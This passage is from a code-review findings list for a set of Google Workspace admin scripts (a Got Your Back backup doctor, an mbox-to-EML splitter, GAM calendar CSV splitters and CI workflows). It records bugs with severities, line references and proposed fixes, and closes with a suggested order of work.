- Where: line 169 `missing = rows - on_disk - quarantined`.
- Why: the README claims "Reconciles the database against the disk". The DB holds `message_filename` for every row, so checking each named file exists is exact and no slower than `rglob`.
- Fix: iterate `SELECT message_filename FROM messages` and test existence (and quarantine) per file; keep the count as a secondary line. Note the offboarding script has its own `verify_backup_complete`; consider sharing the approach.

### GYB-03 `[ ]` Running the doctor on `.` from inside the backup misses the quarantine sibling
- Severity Low. CONFIRMED (reproduced: same backup healthy by absolute path, "PROBLEM: 1 message(s) ... not quarantined" by `.`).
- Where: line 152 `backup.parent / f"{backup.name}_quarantined"`; `Path(".").name` is `""`.
- Fix: `backup = backup.resolve()` at the top of `doctor()`.

### GYB-04 `[ ]` A `msg-db.sqlite` with a settings table but no `messages` table crashes with a traceback
- Severity Low. CONFIRMED (reproduced: uncaught `sqlite3.OperationalError: no such table: messages` from line 146). `_table_count` returns -1 for a missing table but `rows == -1` is never checked, so even without the crash the branch at 183 would print "Backup verified" for -1 rows; `restored == -1` likewise prints "rows+1 remaining" (207).
- Fix: guard the query and treat a missing `messages` table as a PROBLEM.

### GYB-05 `[ ]` Housekeeping
- SQLite connections are never closed (`with conn:` only commits); five `ResourceWarning: unclosed database` per test run under `-X dev`. Use `contextlib.closing`. Low.
- The README example `gyb_backup_doctor.py /backups/mailboxes/*` also hits every `_quarantined` sibling, which reports "NOT A GYB BACKUP" and exit 2, so the overall exit code is 2 even when every backup is healthy. Recognise `*_quarantined` folders and skip them with a note. Low.
- `backup.iterdir()` at line 101 can raise `PermissionError` uncaught. Low.

### GYB-06 `[ ]` Header scanner: terminator search order and the empty-folder exit code
- Low. CONFIRMED (reproduced): `read_header_block` (48-51) searches the whole buffer for `\r\n\r\n` before trying `\n\n`, so an LF-terminated header block followed by a CRLF blank line in the body returns the body up to that point as "headers" (41 bytes instead of 31 in the test). Harmless unless a body line looks like `Name: <40 000 bytes>`, which would be a false OVERSIZED. Take the minimum of the two positions.
- Low: a folder with zero `.eml` files prints "No oversized headers. Nothing here will trip Gmail's header limit." and exits 0, which is more likely the wrong folder; the docstring's "nothing could be read at all" is exit 2. Warn, or exit 2 when `scanned == 0`.

### GYB-T01 `[ ]` `test_unreadable_file_is_not_reported_as_clean` fails as root and on Windows
- CONFIRMED (fails here on 3.11, 3.12 and 3.13 because the container runs as root; `chmod 0o000` does not block root, and on Windows `os.chmod` only toggles the read-only bit).
- Fix: skip when `os.geteuid() == 0` or on `win32`, or make the file unreadable another way (a directory named `x.eml` raises `IsADirectoryError`, which the scanner also counts as UNREADABLE).

Verified OK: `mode=ro` is honoured; chunk-boundary terminators are handled by re-joining; the 4 MB cap; unfolding counts leading whitespace as Google does; `OSError` per file; exit codes as documented; epoch-dated query relies on ISO text storage, which is what GYB's datetime adapter writes; Python 3.6 syntax.

---

# F. Mbox to EML (`mbox-to-eml/`)

### MBX-01 `[ ]` An unescaped body line starting with `From ` splits a message in two
- Severity Medium. CONFIRMED (reproduced: three files from two messages, one named `0000-00-00 0000 (no subject).eml` holding the tail of the body, counted as written, exit 0).
- Why: the stdlib `mailbox.mbox` splits on any line starting with `From `. Takeout and Vault escape body lines as `>From`; Apple Mail and Thunderbird usually do; a hand-assembled or third-party mbox may not.
- Fix: say in the README that the file must be mboxrd/mboxo-escaped, and have the splitter warn when a produced message has no `From:` or `Date:` header (a strong sign of a split), counting it separately from `written`.

### MBX-02 `[ ]` "Bytes untouched" is true on macOS and Linux only
- Severity Low. CONFIRMED from the stdlib source: `mailbox._mboxMMDF.get_bytes` ends with `string.replace(linesep, b'\n')` where `linesep = os.linesep`, so on Windows every CRLF becomes LF. A CRLF mbox split on Windows is rewritten with LF, which breaks S/MIME or DKIM verification of the `.eml`.
- Fix: read the slice yourself from the message offsets, or document the Windows behaviour.

### MBX-03 `[ ]` Re-running into a non-empty output folder duplicates every message
- Severity Low. CONFIRMED (second run produced `name (2).eml` for all five). Refuse a non-empty folder, or document "use an empty folder".

### MBX-04 `[ ]` Reconciler: label delimiter, Windows redirect encoding, surplus reporting
- Low. CONFIRMED against GAM7 source: drafts are detected with `r["Labels"].split()`; GAM joins labels with `csv_output_field_delimiter`, default `' '` (`glcfg.py` 384), so this works by default but silently finds no drafts for an admin who set the delimiter to `,` or `;`. Split on `[\s,;]+` or document it.
- Low: the README and docstring tell Windows users to shell-redirect `gam ... > gam-label-read.csv`; Windows PowerShell 5 writes UTF-16 and the script dies with a `UnicodeDecodeError` (caught as `ValueError`, exit 2, but with a confusing message). Recommend `gam redirect csv ./gam-label-read.csv user ...` as the CSV-splitter README already does, and open with `utf-8-sig`.
- Low: when a key occurs n times in the mbox and n-1 in the GAM read, every mbox message with that key is printed as ONLY IN MBOX (the surplus is per key). Cosmetic.
- Low: `date_stamp` uses the sender's own offset, so the folder's sort order mixes time zones. Cosmetic.

Verified OK: `decode_header` handles `Header` objects from 8-bit subjects; `parsedate_to_datetime` failures caught on every version; `safe_name` cases match the tests; case-insensitive collisions are caught by `os.path.exists`; `create=False`; exit codes as documented; naive `Date` headers are handled identically on both sides of the diff; missing CSV columns exit 2; the Counter multiset logic is correct; Python 3.6 syntax.

---

# G. Split GAM Calendar CSV (`split-gam-calendar-csv/`)

### CSV-01 `[ ]` The calendar filter silently drops UTC events on Python 3.8 to 3.10
- Severity Medium. CONFIRMED by the Python documentation (`fromisoformat` accepts a trailing `Z` only from 3.11; before that it only parsed the formats `isoformat()` emits).
- Where: `filter_and_split.py:39` `datetime.fromisoformat(start_datetime_str)`.
- What happens: GAM prints `start.dateTime` as the Calendar API gives it; UTC events are `2026-07-01T07:00:00Z`. On the repository's stated floor (3.8+) every such event raises `ValueError`, is swallowed by `except (ValueError, TypeError): continue`, and nothing is printed about skipped rows.
- Fix: `.replace("Z", "+00:00")` as `tenant_scope.py` already does, and print a count of rows skipped as unparseable.

### CSV-02 `[ ]` All three scripts swallow every exception and exit 0
- Severity Low. CONFIRMED by reading (`split_by_size.py:60-61`, `filter_and_split.py:75-76`, `split_csv.py:51-52`); file-not-found and missing-column paths also `return` with exit 0. A wrapper cannot tell success from failure. No exit codes are documented. Fix: `sys.exit(1)` on error.

### CSV-03 `[ ]` Edge cases
- An empty input file makes `reader.fieldnames` None, so `'primaryEmail' not in headers` raises `TypeError`, reported as "An unexpected error occurred: argument of type 'NoneType' is not iterable" (`split_csv.py:20`, `filter_and_split.py:26`). Low.
- `encoding='utf-8'` misreads a BOM as part of the first header name (an Excel "CSV UTF-8" re-save adds one), so `primaryEmail` is "not found" though visibly present; `utf-8-sig` costs nothing. Low.
- `split_by_size.py` accepts 0 or a negative size (one file per row); validate `> 0`. Output part files silently overwrite earlier ones in the working directory. Low.
- Email local parts are case-preserved in file names, so `John@` and `john@` collide on Windows and macOS. Low.

### CSV-04 `[ ]` Improvement: memory
- `split_csv.py` and `filter_and_split.py` hold the whole file in memory as dicts; for the "hundreds of megabytes" exports the README describes that is several gigabytes of RAM on a laptop. Stream instead (one writer per user opened lazily, or two passes). `split_by_size.py` already streams correctly.
- Style: no shebang or header comment (the contributing guideline asks for one), and no tests for these three scripts.

---

# H. CI, workflows and repository-wide

### CI-01 `[ ]` `offboarding-tests.yml`
- `pull_request.paths` omits the workflow file itself (the `push` trigger includes it). Low.
- The `command-builder` job runs `npm install` with no `package-lock.json` tracked (`.gitignore` says "npm ci in CI only", but there is no lockfile to `ci` from), so a jsdom release can break CI unrelated to a change. Commit a lockfile and use `npm ci`. Low.
- Python 3.13 is not in the matrix although users will have it. Low.

### CI-02 `[ ]` Most test suites never run in CI
- No workflow runs `test_tenant_scope.py` (294 tests), `test_gyb_tools.py`, `test_vault_export_tools.py` or `test-gam-update.sh`; the checker's suite runs only on release. A single "all tools" workflow on push would have caught AUD-T01 and GYB-T01. Run the audit suite with `python -m unittest` or after fixing AUD-T01.

### CI-03 `[ ]` `gam-script-checker-release.yml`
- Logic is sound: tag/version gate, tests and the blind runner, `git archive` from the tagged commit, hashes appended once. No change needed.

### REPO-01 `[ ]` Layout and docs
- The six old-name stub folders are intentional redirects; the two `VERSION` files kept there match the live versions (5.7.2 and 1.7.2). OK.
- Python floors are consistent across READMEs (3.8+, 3.9+ for the audit and the checker, 3.6+ for the GYB and mbox tools).
- The top-level README's test-count and feature claims should be revisited after the fixes above (audit test count, licence waste coverage, offboarding snapshot contents).

---

# Suggested order of work

0. GAM Script Checker under-warnings and paste drain: CHK-01 to CHK-11, then CHK-15 (paste crash exit code) and the fixtures in CHK-T01, then release v0.4.7.
1. Safety and wrong-state items: OFF-01, OFF-02 (verify on the dev tenant first), OFF-03, OFF-04, AUD-05, AUD-08, AUD-09, AUD-11, UPD-01, UPD-02.
2. Client-facing correctness in the audit: AUD-01, AUD-02, AUD-03, AUD-04, AUD-06, AUD-07, AUD-18 to AUD-24; then move the audit test main block (AUD-T01) and add the tests in AUD-T02 alongside each fix.
3. Operator-facing correctness in offboarding: OFF-05 to OFF-09 and the builder test.
4. Small tools: GYB-01, GYB-02, CSV-01, MBX-01, then the Low items in each.
5. Docs sweep: every "Docs drift" item, the READMEs' test counts and exit codes, the command builder text.
6. CI: CI-02 first, then CI-01.
7. Improvements, as time allows.
